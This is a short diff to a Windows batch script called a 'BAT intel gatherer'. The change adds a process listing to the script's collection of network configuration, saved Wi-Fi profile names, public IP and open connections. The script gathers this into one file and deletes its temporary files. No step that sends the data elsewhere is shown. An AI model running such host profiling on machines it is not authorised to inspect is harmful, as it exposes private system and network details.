@@ -8,6 +8,7 @@ ipconfig > ipinfo.txt
 netsh wlan show profiles > networkinfo.txt
 nslookup myip.opendns.com resolver1.opendns.com > publicip.txt
 netstat -aon > portscan.txt
+tasklist > tasklist.txt
 copy/b *txt systeminfo.txt
 
 REM BAT intel gatherer by syswriath.
@@ -20,6 +21,7 @@ del ipinfo.txt
 del networkinfo.txt
 del publicip.txt
 del portscan.txt
+del tasklist.txt
 cls
 
 ECHO AND THE BAT LIVES TO SEE YET ANOTHER DAY!
